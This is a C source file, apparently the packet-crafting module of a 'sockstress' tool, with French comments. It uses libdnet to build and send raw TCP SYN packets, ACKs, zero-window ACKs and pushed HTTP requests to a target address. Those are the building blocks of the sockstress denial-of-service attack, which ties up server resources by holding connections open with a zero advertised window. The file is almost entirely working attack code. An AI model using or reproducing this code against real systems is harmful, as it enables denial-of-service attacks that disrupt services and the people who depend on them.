#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dnet.h>

#include "tcpcreate.h"
#include "sockstress.h"

uint16_t sport = 10000;
uint32_t saddr = 0x8672a20a;
ip_t *handleIP;
rand_t *handleRand;

void init_packet_creation(char *dev)
{
  intf_t *hintf;
  struct intf_entry intf_entry;

  // On recupere notre adresse IP
  hintf = intf_open();
  strcpy(intf_entry.intf_name,dev);
  intf_entry.intf_len = sizeof(struct intf_entry);

  intf_get(hintf, &intf_entry);
  //memcpy(&saddr,&intf_entry.intf_addr.addr_ip,4);
  saddr=intf_entry.intf_addr.addr_ip;
  printf("Adresse IP source: %lx\n",saddr);
  //printf("Interface d'emission: %s -> %s\n",intf_entry.intf_name, addr_ntoa(&(intf_entry.intf_addr)));
  intf_close(hintf);

  handleRand = rand_open();
  handleIP = ip_open();
}

void close_packet_creation()
{
  rand_close(handleRand);
  ip_close(handleIP);
}

size_t send_packet(char *data, size_t len)
{
  return ip_send(handleIP, data, len);
}

int send_tcp_syn(uint32_t destination, uint16_t dport)
{
  char *packet;
  int packetsize=40; // Taille des entetes (IP + TCP)
  size_t nsend;
  uint16_t id;
  uint32_t seq;
  uint16_t port;

  packet = malloc(packetsize);
  rcdmalloc(packet);

  // On utilise le port source suivant
  sport++;

  // On récupère un id aléatoire
  id = rand_uint16(handleRand);
  seq = rand_uint32(handleRand);
  port = rand_uint16(handleRand);
  if (port < 1024 ) port +=1024;

  ip_pack_hdr(packet, 0, packetsize, id, 0, TTL, IP_PROTO_TCP, saddr, destination);

  tcp_pack_hdr(packet + 20, sport, dport, seq, 0, TH_SYN, 14, 0);

  ip_checksum(packet, packetsize);

  nsend = send_packet(packet, packetsize);

  if (nsend != packetsize)
    printf("Erreur lors de l'envoi du packet\n");

  return (int) nsend;
}

int send_tcp_ack(uint32_t destination, uint16_t id, uint16_t dport, uint16_t sport, uint32_t seq, uint32_t ack)
{
  char *packet;
  int packetsize=40;
  size_t nsend;

  packet = malloc(packetsize);
  rcdmalloc(packet);

  ip_pack_hdr(packet, 0, packetsize, id, 0, TTL, IP_PROTO_TCP, saddr, destination);

  tcp_pack_hdr(packet + 20, sport, dport, seq, ack, TH_ACK, 14, 0);

  ip_checksum(packet, packetsize);

  nsend = send_packet(packet, packetsize);

  if (nsend != packetsize)
    printf("Erreur lors de l'envoi du packet\n");

  return (int) nsend;
}


int send_tcp_win_zero(uint32_t destination, uint16_t id, uint16_t dport, uint16_t sport, uint32_t seq, uint32_t ack)
{
  char *packet;
  int packetsize=40;
  size_t nsend;

  packet = malloc(packetsize);
  rcdmalloc(packet);

  ip_pack_hdr(packet, 0, packetsize, id, 0, TTL, IP_PROTO_TCP, saddr, destination);

  tcp_pack_hdr(packet + 20, sport, dport, seq, ack, TH_ACK, 0, 0);

  ip_checksum(packet, packetsize);

  nsend = send_packet(packet, packetsize);

  if (nsend != packetsize)
    printf("Erreur lors de l'envoi du packet\n");

  return (int) nsend;
}

int send_request(uint32_t destination, uint16_t id, uint16_t dport, uint16_t sport, uint32_t seq, uint32_t ack, char *request)
{
/*   char *requete = "GET / HTTP/1.1\n\ */
/* User-Agent: Mozilla/5.0 Gecko/20090729 Firefox/3.5.2\n\ */
/* Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*\/\*;q=0.8\n\ */
/* Accept-Language: fr-fr,fr;q=0.8,en-us;q=0.5,en;q=0.3\n\ */
/* Accept-Encoding: gzip,deflate\n\ */
/* Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\n\ */
/* Keep-Alive: 400\n\ */
/* Connection: keep-alive\n"; */


  char *packet;
  size_t nsend;
  int packetsize=40+strlen(request);


  packet = malloc(packetsize);
  rcdmalloc(packet);

  ip_pack_hdr(packet, 0, packetsize, id, 0, TTL, IP_PROTO_TCP, saddr, destination);

  tcp_pack_hdr(packet + 20, sport, dport, seq, ack, TH_ACK | TH_PUSH, 254, 0);

  memcpy(packet + 20 + 20, request, strlen(request));


  ip_checksum(packet, packetsize);

  nsend = send_packet(packet, packetsize);

  if (nsend != packetsize)
    printf("Erreur lors de l'envoi du packet\n");

  return (int) nsend;
}


